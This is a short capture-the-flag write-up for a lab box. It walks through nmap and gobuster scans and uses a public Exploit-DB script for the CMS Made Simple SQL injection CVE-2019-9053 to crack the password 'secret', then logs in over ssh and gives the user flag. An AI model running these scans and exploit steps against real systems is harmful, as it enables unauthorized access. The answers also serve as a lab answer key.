# Simple CTF Writeup

How many services are running under port 1000?
```
nmap -sC -sV -A <target ip>
```
> 2

What is running on the higher port?
> ssh

What's the CVE you're using against the application?
```
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 250
```
We see a `/simple` which leads us to a CMS Made Simple vulnerability. Search this up online and we see [this](https://www.exploit-db.com/exploits/46635).
> CVE-2019-9053

To what kind of vulnerability is the application vulnerable?
> SQLi

What's the password?

Use the exploit from Exploit-DB with a few minor changes. I had to delete the `termcolor` module and fix a few print statements.
```
python2 exploit.py -u http://<target-ip>/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```
```
Output:
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```
> secret

Where can you login with the details obtained?
> ssh

What's the user flag?
```
ssh mitch@<target_ip> -p2222
```
> G00d j0b, keep up!

Is there any other user in the home directory? What's its name?


What can you leverage to spawn a privileged shell?


What's the root flag?

